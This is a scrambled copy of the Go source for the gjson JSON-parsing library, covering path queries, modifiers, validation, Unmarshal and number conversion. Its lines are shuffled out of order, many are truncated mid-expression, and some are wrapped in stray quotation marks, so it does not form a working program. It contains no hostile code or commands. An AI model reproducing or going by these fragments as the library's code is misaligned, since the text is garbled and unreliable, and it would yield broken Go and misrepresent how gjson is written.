// ModifierExists returns true when the specified modifier exists.
"Raw:  string(append(multires, ']')),"
case 'n':
more    bool
"r.ai = make([]interface{}, 0)"
// expects that the lead character is a '[' or '{'
if t.Type == Number {
// append the last part
"func tonum(json string) (raw string, num float64) {"
"return append(dst, string(d)...)"
str = str[:len(str)-8
pmatch = rp.part == key
v := goval.Addr()
if data[i] == '-' {
return dst
// A path is a series of keys searated by a dot.
if len(path) >= 2 
 j-- {
"jsons = append(jsons, ',')"
"b = append(b, ',')"
"parseArray(c, 0, path[2:])"
// Type is the json type
//  if !gjson.Valid(json) {
"out = append(out, '}')"
if path[0] == '[' 
"func GetManyBytes(json []byte, path ...string) []Result {"
type Result struct {
 path[1] == '(' {
"return ""Number"""
"// first character in path is either '[' or '{', and has already been checked"
"string, for JSON string literals"
"case reflect.Float32, reflect.Float64:"
if json[i] <= ' ' {
return res
i < len(path)-1 
"slice := reflect.MakeSlice(goval.Type(), len(jsvals), len(jsvals))"
"[]interface{}, for JSON arrays"
if kind == '{' {
pathOut = pathOut[len(args):]
res = res.Get(path[1:])
"i, ok = validany(data, i)"
res = qval.Get(rp.query.path)
"1, c.json[s:i], false, true"
"case '!', '=', '<', '>', '%':"
if json[i] == vc {
op = value[:opsz]
var opsz int
if i >= len(data) {
if !rp.more 
// Str is the json string
json := t.Raw
value string
if j > 0 {
if !res.Exists() {
"//  ""c"
if len(multires) > 1 {
"""strings"""
"// The return values are (i int, res Result, ok bool)"
"multires = append(multires, ',')"
" 1, true"
return string(str)
"return i, json[s:]"
json  string
"//  if gjson.Get(json, ""name.last"").Exists(){"
"case '""':"
goval.SetInt(jsval.Int())
 json[i] > 'z' {
 data[i] == 'E' {
if valueize {
res := Parse(pathOut)
hit = pmatch 
r.alogok = true
"// b is uppercase, convert b to lowercase"
"b = append(b, sub.name...)"
case Null:
"_, ok := modifiers[name]"
if vesc {
// Get searches result for the specified path.
return value.Str < rpv
vc := c.json[i]
if hit {
"// If the result represents a non-existent value, then an empty array will be"
var value Result
} else if b[i] >= 'A' 
return value.Num >= rpvn
r.oi[key.Str] = value.Value()
case end:
"return ""JSON"""
// The order when comparing two different type is:
r.o = make(map[string]Result)
//   first_name   
"if i, ok = validstring(data, i"
"return match.Match(value.Str, rpv)"
func ValidBytes(json []byte) bool {
if len(sub.name) > 0 {
// using a subselector path
// Result represents a json value that is returned from Get().
calcd bool
c.value.Str = unescape(val[1 : len(val)-1])
// possible modifier
"func AddModifier(name string, fn func(json, arg string) string) {"
} else if path[i] == '=' {
"assign(jsvals[i], slice.Index(i))"
"func parseSubSelectors(path string) (sels []subSelector, out string, ok bool) {"
r.vc = vc
"case '[', ']', '{', '}', '(', ')', '"
"//  ""friends."
2:]))
sel.path = path[start:i]
const (
case value[0] == '%':
var rjson string
"func parseInt(s string) (n int64, ok bool) {"
 data[i
"left, right, ok := splitPossiblePipe(rp.alogkey)"
if i < len(path)-1 
 data[i] == 'u' 
 value[1] == '%':
 i < goval.Type().NumField()
op    string
"case '""', '"
"dst = append(dst, '""')"
32 {
"return validnull(data, i"
} else if r.vc == '[' {
if res.IsObject() {
" t.Str != ""0"" "
qval.Str = val[1 : len(val)-1]
"return ""String"""
// part of the path into the c.pipe field and shorten the rp.
// ForEachLine iterates through lines of JSON as specified by the JSON Lines
// Map returns back an map of values. The result should be a JSON array.
value Result
"return i, res, false"
epart := []byte(path[:i])
"i, val = parseNumber(c.json, i)"
r.query.value = v
"""pretty"":  modPretty,"
func Valid(json string) bool {
if len(multires) == 0 {
func (t Type) String() string {
 s[i] == '
"var pmatch, kesc, vesc, ok, hit bool"
switch goval.Kind() {
"b = append(b, raw...)"
//   .cap                       
type Type int
"case 't', 'f', 'n':"
c.value.Str = val[1 : len(val)-1]
rp := parseObjectPath(path)
// False is a json false boolean
return bytesString(out)
"if fn, ok := modifiers[name]"
 data[i] == '-' {
pretty.DefaultOptions
"//  ""name.last""          >> ""Anderson"""
if len(raw) == 0 {
case 'r':
if json[i] > '
return value.Num == rpvn
"fillIndex(json, c)"
return value.Str == rpv
var partidx int
"return ""true"""
"_, ok := validpayload(stringBytes(json), 0)"
"str = append(str, '""')"
(data[i] >= 'a' 
if rp.more {
case Number:
//    ]
// look for an escaped slash
 j > 0
// int
key:
"return ""Null"""
res.Str = val[1 : len(val)-1]
"(==""one"")   "
if c.json[j] != '
// exp
String
if goval.Type().Key().Kind() == reflect.String 
"if tag != """" {"
"return stringLessInsensitive(t.Str, token.Str)"
func (t Result) IsObject() bool {
if path[i] == '!' {
rp.alogkey = left
"//  ""child"
// array containing one result.
"n, _ := parseInt(t.Str)"
return Parse(string(json))
if path[i] == '[' {
var s = i
"// expects that the lead character is a '""'"
32 < b[i] {
opts.Indent = value.String()
"// both are uppercase, do nothing"
start = i 
for len(v) > 0 
r.o[key.Str] = value
end = ')'
return t.Type != Null 
// split the left and right side of the path with the pipe character as
// start of the value part
return value.Num < rpvn
"return t.Str != """" "
const maxInt53 = 2251799813685247
if c.json[i-1] == '
"i, val = parseSquash(c.json, i)"
// The caseSensitive paramater is used when the tokens are Strings.
r.query.path = qpath
"var jsons = make([]byte, 0, 64)"
if path[1] == '.' {
// the delimiter. This is a little tricky because we'll need to basically
if depth == 1 {
path[i] == '!' 
" -1, true"
"if u, ok := v.Interface().(json.Unmarshaler)"
var sign bool
"if i, ok = validcomma(data, i, '}')"
// AddModifier binds a custom modifier command to the GJSON syntax.
"if json[i] >= '""' "
(query[1] != '(' 
"func Get(json, path string) Result {"
// this is slightly different from getting s string value
key.Str = unescape(str[1 : len(str)-1])
// Null is a null json value
res = qval
 data[i] == 'a' 
 s[len(s)-1] <= ' ' {
last := nameOfLast(sub.path)
if len(path) > 0 
on    bool
case reflect.Array:
 path[1] == '.' {
" rpv[0] == '""' "
path[i] == '=' 
u.UnmarshalJSON([]byte(jsval.Raw))
 ok {
"pathOut = """""
case reflect.Map:
func ParseBytes(json []byte) Result {
 i < len(jsvals)
break loop
var npath string
// GetMany searches json for the multiple paths.
case value[0] == '=' 
Num float64
if ok {
 (path[i
goval.SetFloat(jsval.Float())
"r.path = """""
path[i] == '<' 
if data[i] < ' ' {
"func unescape(json string) string { //, error) {"
// go into escape mode. this is a slower path that
func queryMatches(rp 
rp.path = left
"value.Str = """""
res.Raw = string(b)
3 <= len(data) 
if len(path) == 0 
fieldsmu.RLock()
"jsons = append(jsons, []byte(raw)...)"
start := 1
newval := reflect.New(goval.Elem().Type())
case 'b':
if i == 0 
raw = res.String()
// Raw is the raw json
// iterator will pass back one value equal to the result.
"Number, for JSON numbers"
"b = appendJSONString(b, ""_"")"
c.piped = true
"// If working with bytes, this method preferred over ValidBytes(string(data))"
const minInt53 = -2251799813685248
switch t.Type {
// Becomes
ch = ']'
return bytesString(pretty.Pretty(stringBytes(json)))
procQuery := func(qval Result) bool {
"case ""!%"":"
 data[i] <= 'f') 
key.Raw = str
 i < len(component)
"float64, for JSON numbers"
j = i
"""sync/atomic"""
// So for this query:
var parsedArgs bool
"//  ""children""           >> [""Sara"",""Alex"",""Jack""]"
path = trim(query[2:i])
if count%2 == 0 {
func runeit(json string) rune {
var possible bool
"(first_name==""Murphy"").last"
 t.Raw[0] == '['
r.path = path[:1]
return t.Num < token.Num
package gjson
// Value returns one of these types:
"out = append(out, '{')"
func (t Result) Uint() uint64 {
value.Type = Number
"if i, ok = validcomma(data, i, ']')"
case reflect.Interface:
"func modUgly(json, arg string) string {"
c.value = res
// allow for exponential numbers
 !rp.more
raw := res.Raw
func (t Result) Exists() bool {
goval.Type().Elem().Kind() == reflect.Interface {
"func assign(jsval Result, goval reflect.Value) {"
"res := make([]Result, len(path))"
JSON
"for i, path := range path {"
func parseArray(c 
"b = append(b, kind"
"ildren.0""         >> ""Sara"""
"t', '"
"(==""one"")).cap"
if i == len(path)-1 {
"return ""False"""
// calculated result
ai []interface{}
"i, val, vesc, ok = parseString(json, i)"
"//  value := gjson.Get(json, ""name.last"")"
"// parseSubSelectors returns the subselectors belonging to a '[path1,path2]' or"
"// This function expects that the json is well-formed, and does not validate."
if queryMatches(
"return """", """", """", """", i, false"
// need another code
"return rpv != ""true"""
var raw string
"func parseNumber(json string, i int) (int, string) {"
case 't':
var keys bool
goto right
"for j, k := 0, 0"
pipe  string
var c = 
 path[i] == '>' {
res.Type = False
if data[i] == ']' {
r.vc = json[i]
if json[i] == 'e' 
func (t Result) String() string {
"return rpv == ""false"""
"// peek at the next byte and see if it's a '@', '[', or '{'."
return t.Num != 0
parse_key_string_done:
return i 
case '{':
r.oi = make(map[string]interface{})
"Type: JSON,"
 i < len(s)
// JSON is a raw block of JSON
return false
"func parseString(json string, i int) (int, string, bool, bool) {"
r.part = string(epart)
 n >= minUint53 
piped   bool
pushSel()
if json[i-1] == '
colon = 0
"// A path is in dot syntax, such as ""name.last"" or ""age""."
if !possible {
more  bool
// Each line is returned as a GJSON Result.
case 'f':
if sign {
remain = query[i
"_, res, ok := parseAny(c.json, alog[j], true)"
if s[i] < ' ' 
return r.oi
if i
 json[i] <= '}' {
raw = json
return map[string]Result{}
"validate, 0)"
"r = utf16.DecodeRune(r, runeit(json[i"
 middle
return json[:i
switch value.Type {
"res.ForEach(func(key, value Result) bool {"
kind := path[0]
c.pipe = right
"// Or,"
type subSelector struct {
case reflect.Ptr:
if path[1] == '[' {
1] == '
"n, ok := floatToUint(t.Num)"
 int64(s[i]-'0')
wild  bool
if path[i] > ' ' {
 json[i] == ':' {
 Valid(sub.name) {
return Result{}
args = pathOut[:idx]
case reflect.Slice:
// GetManyBytes searches json for the multiple paths.
"func (t Result) arrayOrMap(vc byte, valueize bool) (r arrayOrMapResult) {"
if query[i] == '
case 'u':
res.Type = Number
} else if path[i] == '.' {
r.pipe = path[i
return s
if procQuery(qval) {
goto key
end = ']'
"case ',':"
uXXXX
"return i, true"
"_, ok := validpayload(json, 0)"
"func appendJSONString(dst []byte, s string) []byte {"
// execModifier parses the path to find a matching modifier function.
value.Type = Null
opts := 
validate) == 1 {
"return path, op, value, remain, i "
const maxUint53 = 4503599627370495
if t.Type == String {
switch c.json[i] {
"""time"""
"// iterated. If the result is an Object, the iterator will pass the key and"
 b[i] <= 'Z' {
// format (http://jsonlines.org/).
if n%2 == 0 {
"b = appendJSONString(b, sub.name)"
if len(goval.Type().PkgPath()) > 0 {
"// squash the value, ignoring all nested arrays and objects."
lines bool
var ret string
if t.Type != JSON {
case reflect.String:
if k > 0 {
"func (t Result) Less(token Result, caseSensitive bool) bool {"
 json[i] == '}' {
pmatch = partidx == h
// Int returns an integer representation.
"return rpv == ""true"""
name = path[1:i]
rpv := rp.query.value
} else if hit {
"res := Get(rjson, path[1:])"
"r.ai = append(r.ai, value.Value())"
"idx := strings.IndexByte(pathOut, '"
qval.Type = True
if len(arg) > 0 {
if json[i] <= '-' {
var res Result
return value.Str >= rpv
if t.Raw[0] == '-' {
"return i, json[s-1:], false, false"
value.Raw = json[i:] // just take the entire raw
path[i] == '>' 
"func validpayload(data []byte, i int) (outi int, ok bool) {"
case ']':
res := res.Get(rp.alogkey)
opts))
if !ok {
Number
if rp.query.on {
"for i, j := len(keyValues)-2, 0"
"for i, j := len(values)-1, 0"
"case ""="":"
"map[string]interface{}, for JSON objects"
// Number is json number
// provide enough space to encode the largest utf8 possible
"out = append(out, ',')"
path = path[i
sf := fields[goval.Type().String()]
"str = append(str, '"
i = 2
c.calcd = true
"// inside selector, balance brackets"
"return """""
".first""    >> [""James"",""Roger""]"
"//   ==""Murphy""   "
 t.Raw[0] == '{'
"return validnumber(data, i"
return value.Num > rpvn
partidx = -1
var b []byte
"return 0, false"
switch pathOut[0] {
" 3, true"
"case ""<"":"
 json[i] <= '9') 
"_, ok := validpayload(data, 0)"
// ParseBytes parses the json and returns a result.
func parseQuery(query string) (
 j > s2-1
"return ""True"""
"out = append(out, ']')"
path    string
 i-- {
if path[i
"//   path, op, middle, and right."
// The result should be a JSON array or object.
if data[i] == '}' {
if path[i] <= ' ' 
"""encoding/json"""
".2""           >> ""Jack"""
atomic.StoreUintptr(
"if _, ok := r.oi[key.Str]"
if res.IsArray() {
"b = append(b, kind)"
return t.Type == JSON 
// fallback to a standard conversion
func Parse(json string) Result {
r.query.all = true
goval.Set(reflect.ValueOf(jsval.Value()))
var ok bool
"r.a = make([]Result, 0)"
jsval.Type == String {
"return validfalse(data, i"
"// equally assigned to Go string, int, byte, uint64, etc. This rule applies to"
"""sync"""
"n, _ := strconv.ParseFloat(t.Str, 64)"
Str string
 data[i] > '9' {
5 > len(json) {
"return !match.Match(value.Str, rpv)"
"case '}', ']':"
"// ""name"" that exists"
"println(""value exists"")"
jsvals := jsval.Array()
if i > len(path) {
var values []Result
"var start, end byte"
 n <= maxUint53 {
//  Null < False < Number < String < True < JSON
res = qval.Get(rp.path)
var json = t.Raw
} else if path[i] == start {
type arrayOrMapResult struct {
"// inside selector string, balance quotes"
args = pathOut
r.query.op = path[s:i]
"out := make([]byte, 0, len(json))"
// use the Valid function first.
" s[i] == '""' "
"multires = append(multires, '[')"
" 1, false"
"//      {""first"": ""Roger"", ""last"": ""Craig""}"
if i == len(data) {
res.Str = unescape(val[1 : len(val)-1])
1:])
// This operation is not thread safe and should be executed prior to
"1, rp.path)"
left:
continue
c.value.Type = JSON
// less than dash might have valid characters
"key, kesc, ok = c.json[s:], false, false"
"rp, res) {"
// @reverse reverses array elements or root object members.
 i < len(query)
if !rp.arrch {
"n, ok = parseInt(t.Raw)"
"func (t Result) ForEach(iterator func(key, value Result) bool) {"
goto end
"start, end = '[', ']'"
var vesc bool
} else if i == len(c.json) {
"if tag != ""-"" {"
"""unicode/utf16"""
 len(path) > 1 {
//   friends.
if caseSensitive {
"// returned. If the result is not a JSON array, the return value will be an"
1] == '=' 
partidx = int(n)
var qval Result
"', '/', 'b', 'f', 'n', 'r', 't':"
// Package gjson provides searching for json strings.
"return strconv.FormatFloat(t.Num, 'f', -1, 64)"
"return rpv != ""false"""
"n := utf8.EncodeRune(str[len(str)-8:], r)"
if path[j] != '
"case ""<="":"
c.value.Raw = strconv.Itoa(h - 1)
// parse the compare op from the value
"""unicode/utf8"""
"case reflect.Uint, reflect.Uint8, reflect.Uint16, reflect.Uint32,"
} else if a[i] > b[i]
return 1
"case ' ', '"
if len(path) > 1 {
"func modReverse(json, arg string) string {"
end:
// gjson.Unmarshal will automatically attempt to convert JSON values to any Go
// parseAny parses the next value from a json string.
r.alogkey = path[2:]
data[i
"return pathOut, res, false"
var ( // used for testing
goto parse_key_string_done
"return ""false"""
return t.Raw < token.Raw
"case ""indent"":"
return Parse(rjson)
if c.json[i] == '}' {
// DisableModifiers will disable the modifier syntax
"i, hit = parseObject(c, i"
case json[i] == '
return uint64(t.Num)
2] == 'l' {
"validate, 1)"
"func validobject(data []byte, i int) (outi int, ok bool) {"
return n
"return n, true"
"return i, res, true"
value = value[1:]
if len(rpv) > 2 
if path[i] == '.' {
if t.Type > token.Type {
res.Index = 0
 j < 4
(name)
"res[i] = Get(json, path)"
if f.CanSet() {
"""errors"""
goto left
return int64(t.Num)
"iterator(Result{}, t)"
return 0
return len(a) < len(b)
"if _, ok := r.o[key.Str]"
"func validnull(data []byte, i int) (outi int, ok bool) {"
// all types.
// When the value is found it's returned immediately.
pushSel := func() {
 json[i] == ']' 
"out = append(out, '[')"
"case ""width"":"
for {
return rune(n)
 json[i] == 'E' {
 s[i] <= '9' {
return true
func parseArrayPath(path string) (r arrayPathResult) {
"func Unmarshal(data []byte, v interface{}) error {"
colon := 0
r.part = path
// The dot and wildcard character can be escaped with '
"func ModifierExists(name string, fn func(json, arg string) string) bool {"
type arrayPathResult struct {
"r.a = append(r.a, value)"
return value.Num != rpvn
parsedArgs = true
"pmatch = match.Match(unescape(key), rp.part)"
if t.Type == Null {
 data[i] <= 'F')) {
res := c.value.Get(c.pipe)
// IsArray returns true if the result value is a JSON array.
// String is a json string
qval.Raw = val
case '
if c.json[i] == '
"i, val = parseSquash(json, i)"
 query[i] == ')' {
goval.Set(newval)
"r := t.arrayOrMap(0, true)"
"case '{', '[', '""':"
value.Type = JSON
var multires []byte
"return getBytes(json, path)"
case JSON:
return t.Num
= len(value.Raw) - 1
if len(multires) > 0 
return json
goval.SetBool(jsval.Bool())
fields[goval.Type().String()] = sf
"1:], true"
s = s[1:]
 uint64(s[i]-'0')
qval.Type = False
 i >= 0
c.lines = true
opts.Width = int(value.Int())
"out = append(out, keyValues[i"
 !c.value.Exists() {
"assign(value, goval.Index(i))"
var validate uintptr = 1
if i == len(s) {
"func validany(data []byte, i int) (outi int, ok bool) {"
switch data[i] {
"//  ""children.1""         >> ""Alex"""
"if !iterator(key, value) {"
// query
 len(t.Raw) > 0 
case ':':
// ValidBytes returns true if the input is valid json.
"//    ""name"": {""first"": ""Tom"", ""last"": ""Anderson""},"
} else if json[i] == '[' {
// String returns a string representation of the type.
func (t Result) Bool() bool {
qval.Type = String
r.more = true
case False:
 i < len(json)
if rp.alogok {
"res := Get(json, sub.path)"
keys = true
json[i] == '}' {
if len(t.Raw) == 0 {
"str = append(str, 0, 0, 0, 0, 0, 0, 0, 0)"
"tag := strings.Split(f.Tag.Get(""json""), "","")[0]"
"case '-', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9':"
"func parseLiteral(json string, i int) (int, string) {"
// A Result is returned when the hit param is set.
1] == 'u' 
r.query.value = value
// then input expects that the path already starts with a '@'
"bool, for JSON booleans"
func (t Result) IsArray() bool {
 i < len(path)
return c.value
"return validtrue(data, i"
"return sels, path, true"
if atomic.LoadUintptr(
c.value.Num = float64(h - 1)
var val string
0].Raw...)
// Type is Result type
f := goval.Field(idx)
 data[i] <= '9') 
path[i] == end {
1].Raw...)
"var modifiers = map[string]func(json, arg string) string{"
if goval.Type().Elem().Kind() == reflect.Uint8 
pathOut = path[i
// UnmarshalValidationEnabled provides the option to disable JSON validation
if rp.arrch 
if true {
path  string
func (t Result) Array() []Result {
"jsval.ForEach(func(key, value Result) bool {"
if path[0] == '@' {
case '}':
// parse the entire path.
for i := 1
"out = append(out, ':')"
"if json[i] != '""' {"
(service_roles.
fieldsmu.Lock()
if !parsedArgs {
colon = i
' character.
key = value
 s[0] == '-' {
// Array returns back an array of values.
//  
return r.ai
case True:
return value.Num <= rpvn
 path[0] == '{' {
opsz = 1
r.wild = true
1] == 'u' {
reflect.Uint64:
 i < len(b)
"//  ""children."
"i, val = parseLiteral(json, i)"
} else if data[i] == '
"// the value of each item. If the result is not a JSON array or object, the"
if json[i] < 'a' 
value = trim(query[j:i])
 value[1] == '=':
if !DisableModifiers {
c.value = Result{
type parseContext struct {
"_, args = parseSquash(pathOut, 0)"
"pmatch = match.Match(key, rp.part)"
"out = append(out, values[i].Raw...)"
f := goval.Type().Field(i)
if depth == 0 {
json[i
sf[f.Name] = i
1] == '{') {
vc := json[i]
 !ok {
(data[i] >= 'A' 
path = npath
if !iterator(res) {
" i, j = i-2, j"
var end byte
case json[i] < ' ':
"return bytesString(pretty.PrettyOptions(stringBytes(json), "
c.value.Raw = val
func parseObjectPath(path string) (r objectPathResult) {
"""encoding/base64"""
"return i, json[s:i]"
"//      {""first"": ""James"", ""last"": ""Murphy""},"
// the first '[' or '{' has already been read
func (t Result) Value() interface{} {
// we expect it to be correct so just consume it
switch query[i] {
"n', '"
// True is a json true boolean
// ForEach iterates through values.
"jsons = append(jsons, '[')"
if vc == 0 {
// try to directly convert the float64 to uint64
1 < len(json) {
qval.Str = unescape(val[1 : len(val)-1])
// Num is the json number
// Float returns an float64 representation.
if path[i] > '
var ch byte
for j := 0
parseContext{json: json}
if !DisableModifiers 
if json[i] == ']' 
c.value.Type = True
 j == 0 {
 t.Raw[i] > '9' {
 len(t.Raw) != 0
"return validobject(data, i"
"// value of each item. If the result is an Array, the iterator will only pass"
r.query.op = op
"values = append(values, value)"
case '/':
if b[i] >= 'A' 
// The return value is a Result array where the number of items
"1], false, true"
// If you are consuming JSON from an unpredictable source then you may want to
// get next value
query   struct {
"func validfalse(data []byte, i int) (outi int, ok bool) {"
if enabled {
v = v[:len(v)-1]
 path
"res.Num, _ = strconv.ParseFloat(val, 64)"
case '[':
// Parse parses the json and returns a result.
if !goval.IsNil() {
r := runeit(json[i
return t.Str < token.Str
type objectPathResult struct {
sel.path = path[colon
} else if a[i] > b[i] {
if idx == -1 {
if float64(n) == f 
if r.vc == '{' {
"qpath, op, value, _, fi, ok := parseQuery(path[i:])"
return t.Str
"1], true, true"
} else if path[i] == '
const minUint53 = 0
if len(res.Raw) == 0 {
// try to directly convert the float64 to int64
var DisableModifiers = false
// @ugly modifier removes all whitespace.
"// the query is only looking for existence, such as:"
case reflect.Struct:
var fields = make(map[string]map[string]int)
"func GetMany(json string, path ...string) []Result {"
c.pipe = rp.pipe
"func validnumber(data []byte, i int) (outi int, ok bool) {"
if rp.wild {
if component[i] < ' ' {
key.Index = s
if depth > 0 {
r.query.on = true
possible = true
case value[0] == '>':
 i < len(a) 
if len(s) > 0 
// nameOfLast returns the name of the last component
"func floatToInt(f float64) (n int64, ok bool) {"
"//    ""age"":37,"
"epart = append(epart, path[i])"
if kesc {
"case '{', '[':"
fieldsmu.Unlock()
if json[i] > ' ' {
n := 0
"// If working with bytes, this method preferred over Parse(string(data))"
 json[i] == '[' {
"// Invalid json will not panic, but it may return back unexpected results."
if json[j] != '
func tolit(json string) (raw string) {
switch path[i] {
"return validstring(data, i"
var sel subSelector
Index int
case value[0] == '=':
return value.Str != rpv
 path[0] == '.' 
func isSimpleName(component string) bool {
// Uint returns an unsigned integer representation.
"start, end = '(', ')'"
"i, val, vesc, ok = parseString(c.json, i)"
"i, key, kesc, ok = i"
if json[i] < ']' {
"value.Str, value.Num = """", 0"
"nil, for JSON null"
// take a quick peek for the pipe character. If found we'll split the piped
2] == 'e' {
"subs, path, ok = parseSubSelectors(path)"
if data[i] == '.' {
for j := i - 2
import (
if rp.query.all {
"keyValues = append(keyValues, key, value)"
"str = append(str, json[i])"
var count int
s = s[:len(s)-1]
goval.Elem().Set(newval.Elem())
// sign
"return path[:i], path[i"
"func splitPossiblePipe(path string) (left, right string, ok bool) {"
sf[tag] = i
 path[i] == '
for i := 0
// likely a ']' or '}'
if t.Raw[i] < '0' 
if data[i] >= '0' 
if !((data[i] >= '0' 
if c.json[i] == '[' {
"', '"
"if rp.query.path != """" {"
name string
// Valid returns true if the input is valid json.
if !t.Exists() {
if s[i] >= '0' 
"if i, ok = validcolon(data, i)"
if utf16.IsSurrogate(r) {
"// a is uppercase, convert a to lowercase"
value.Index = s
if i == len(path) {
if colon == 0 {
"""ugly"":    modUgly,"
return value
"// '{""field1"":path1,""field2"":path2}' type subSelection. It's expected that the"
' and '
var args string
// unescape unescapes a string
path = trim(query[2:j])
opts.Prefix = value.String()
"res.ForEach(func(_, value Result) bool {"
"i, str, vesc, ok = parseString(json, i"
o  map[string]Result
ret = json[:i
} else if path[1] == '[' 
" json[i] == ',' {"
" i, j = i-1, j"
"str = append(str, '/')"
goval.Set(reflect.ValueOf(data))
"if c.json[i] == '""' {"
 n >= minInt53 
i := 1
for 
"sels = append(sels, sel)"
default:
// probably a valid number
return n 
switch rp.query.op {
if path[i] == ':' {
func squash(json string) string {
part    string
path[i
"i, res, _ = parseAny(json, i, true)"
pmatch = rp.part == unescape(key)
// Deprecated: Use encoder/json.Unmarshal instead
value = trim(value[opsz:])
func (t Result) Map() map[string]Result {
 right
testWatchForFallback bool
"func parseAny(json string, i int, hit bool) (int, Result, bool) {"
"if i, ok = validany(data, i)"
func nameOfLast(path string) string {
// could be a '
1 : i]
 j < len(alog)
var str string
if len(path) > 0 {
 v[len(v)-1] <= ' ' {
if t.Type < token.Type {
"for _, sub := range subs {"
value.Raw = squash(json[i:])
"return validarray(data, i"
alogkey string
 i < len(data)
4 <= len(data) 
} else {
switch json[i] {
func (t Result) Time() time.Time {
break
if c.piped {
case String:
False
// the '
" rpv[len(rpv)-1] == '""' {"
key.Type = String
"case ""%"":"
" 4, true"
oi map[string]interface{}
"i, val = parseLiteral(c.json, i)"
"case ""!="":"
1] == '@' {
// during the Unmarshal routine. Validation is enabled by default.
sf = make(map[string]int)
var subs []subSelector
modifiers[name] = fn
"func validtrue(data []byte, i int) (outi int, ok bool) {"
2] == 's' 
return []Result{t}
(path[i
"return errors.New(""invalid json"")"
func (t Result) Int() int64 {
case value[0] == '<':
"""github.com/tidwall/pretty"""
if len(json[i:]) >= 6 
"// If the result represents a non-existent value, then no values will be"
1] == '[' 
case reflect.Bool:
 path[0] == '.') {
"b = appendJSONString(b, last)"
opsz = 2
return json[:i]
 !hit {
// Less return true if a token is less than another token.
if data[i] < '0' 
res.Type = JSON
"case ']', ')', '}':"
loop:
//   .last        
part  string
"func execModifier(json, path string) (pathOut, res string, ok bool) {"
ch = c.json[i]
"// type. For example, the JSON string ""100"" or the JSON number 100 can be"
i = len(path)
"func floatToUint(f float64) (n uint64, ok bool) {"
"//    ""children"": [""Sara"",""Alex"",""Jack""],"
 s[0] <= ' ' {
"qval.Num, _ = strconv.ParseFloat(val, 64)"
" 1, json[s-1 : i"
"r := t.arrayOrMap('[', false)"
"assign(jsval, newval.Elem())"
"jsval.ForEach(func(_, value Result) bool {"
return r.a
for i < len(c.json)
"case '[', '(', '{':"
if !value.Exists() {
 data[i] <= '9' {
//  }
"case "">="":"
3] == 'e' {
 (path[0] == '
for i := len(path) - 1
n = uint64(f)
sel.name = path[start:colon]
} else if query[i] == ']' 
"var str = make([]byte, 0, len(json))"
path[i] == '%' 
"func validstring(data []byte, i int) (outi int, ok bool) {"
"multires = append(multires, raw...)"
"""strconv"""
"1], json[1:i]"
} else if path[i] == '<' 
value.Type = True
hasArgs = len(pathOut) > 0
return path[i
"if path[i] == '""' {"
newval := reflect.New(goval.Type().Elem())
raw = json[:i]
// frac
"parseArray(c, i, path)"
// String returns a string representation of the value.
if a[i] < b[i]
c.value.Type = Number
"func ForEachLine(json string, iterator func(line Result) bool) {"
"func GetBytes(json []byte, path string) Result {"
case value[0] == '>' 
' or '-'. let's assume so.
"i, val = parseNumber(json, i)"
// will be equal to the number of input paths.
name := path[1:]
opts.SortKeys = value.Bool()
if i < len(path) {
path string
return t.Raw
"func stringLessInsensitive(a, b string) bool {"
if qval.Type == JSON {
// because we don't need the outer quotes.
// Unmarshal loads the JSON data into the value pointed to by v.
"var pmatch, vesc, ok, hit bool"
if path[i] == '
var h int
"return i, false"
alogok  bool
"""reflect"""
 a[i] <= 'Z' {
func UnmarshalValidationEnabled(enabled bool) {
return path
"return pathOut, fn(json, args), true"
ret = json[:i]
//   
"} else if path[i] == '""' {"
right:
for i < len(c.json) {
"if raw != """" {"
"// To get the number of elements in an array or to access a child path, use"
// runeit returns the rune from the the 
// To access an array value use the index as the key.
 json[i] == '
"// which makes sure that the array ""friends"" has an element of"
"res[i] = GetBytes(json, path)"
// IsObject returns true if the result value is a JSON object.
v := path[s:i]
Null Type = iota
value.Num = 0
"i, n := 0, goval.Len()"
//   service_roles.
 query[i] == '(' {
 i < len(c.json)
"return ret, unescape(json[1:i])"
1] == '=' {
"n, ok := parseUint(rp.part)"
// using all other gjson function.
 n <= maxInt53 {
} else if query[i] == '[' 
"num, _ = strconv.ParseFloat(raw, 64)"
"if idx, ok := sf[key.Str]"
if a[i] < b[i] {
var keyValues []Result
"} else if data[i] == '""' {"
// Exists returns true if value exists.
"jsons = append(jsons, ']')"
if i > 0 {
"value.Raw, value.Num = tonum(json[i:])"
testLastWasFallback  bool
s = i
 path[i] == '.' {
if depth == 1 
if a[i] >= 'A' 
func trim(s string) string {
"case "">"":"
var fieldsmu sync.RWMutex
"func validcolon(data []byte, i int) (outi int, ok bool) {"
var hasArgs bool
s := i
if pmatch 
// peek at the next byte and see if it's a '@' modifier
i-- // backtrack index by one
res := Parse(json)
func parseObject(c 
r.query.path = path[s:i]
depth
i = fi - 1
if sf == nil {
"parseObject(c, i, path)"
pathOut = path[i:]
return bytesString(pretty.Ugly(stringBytes(json)))
"var key, val string"
goval.SetUint(jsval.Uint())
res.Raw = val
piped bool
key.Str = str[1 : len(str)-1]
func (t Result) Float() float64 {
"//  ""age""                >> 37"
 json[i] == '-' {
// break on whitespace and comma
r.path = path[i
case value[0] == '!' 
"// bad query, end now"
1] == '@' 
switch component[i] {
"d, _ := json.Marshal(s)"
var i int
"if rp.query.op == """" {"
"return json, json[1:]"
 rp.piped {
j := 0 // start of value part
"n, _ := parseUint(t.Str)"
 v.Kind() == reflect.Ptr {
value.Raw = tolit(json[i:])
r.part = path[:i]
return []Result{}
"func tostr(json string) (raw string, str string) {"
goval.Set(slice)
" json[i] == ',' "
qval.Type = Number
switch {
// A key may contain special wildcard characters '
raw = res.Raw
if i == n {
c.value.Type = False
switch ch {
// strips off the escape character from the part.
"value.Raw, value.Str = tostr(json[i:])"
s2 := i
var alog []int
"Parse(arg).ForEach(func(key, value Result) bool {"
"if json[i] == '""' {"
"raw = ""null"""
if path[i] == '[' 
if json[i] == '
"i, value, ok = parseAny(json, i, true)"
return value.Str <= rpv
if data[i] == '
 data[i] == 'r' 
if isSimpleName(last) {
res.Type = True
// Get searches json for the specified path.
// whitespace
// This function works almost identically to json.Unmarshal except  that
return ok
if json[i] == '{' {
return nil
"npath, rjson, ok = execModifier(json, path)"
case len(value) == 1:
"} else if query[i] == '""' {"
// GetBytes searches json for the specified path.
//                              
"alog = append(alog, i)"
"""reverse"": modReverse,"
"case reflect.Int, reflect.Int8, reflect.Int16, reflect.Int32,"
"left, right, ok := splitPossiblePipe(rp.path)"
"case ""sortKeys"":"
if path[i-1] == '
} else if path[i] == end {
"func validcomma(data []byte, i int, end byte) (outi int, ok bool) {"
value.Type = String
if a[i]
vc byte
if v.Type().NumMethod() > 0 {
